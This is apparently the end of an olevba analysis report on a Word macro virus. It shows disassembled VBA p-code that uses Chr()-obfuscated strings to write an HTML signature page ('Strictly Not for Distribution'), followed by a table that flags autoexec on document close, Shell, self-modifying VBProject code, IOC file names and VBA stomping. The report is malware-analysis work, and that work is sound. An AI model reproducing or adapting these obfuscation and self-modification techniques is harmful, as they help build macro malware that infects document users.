' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Made possible by the Microsoft Office suite<br>"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "<h2>Word 97/2000 <br> Excel 97/2000 <br>Visio 5/2000<br>Project 98/2000<br></h2>"
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "<br><h2>Strictly Not for Distribution - Moral Panic OnlY!!!!</h2>"
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</html>"
' 	PrintItemNL 
' Line #183:
' 	ArgsCall Reset 0x0000 
' Line #184:
' 	QuoteRem 0x0000 0x0011 "Aţä°äą*sČÄqĆw?ű Q"
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |stray.reg           |Executable file name                         |
|IOC       |gotvis.dll          |Executable file name                         |
|IOC       |projobj.VBE         |Executable file name                         |
|IOC       |Msoffice.Exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

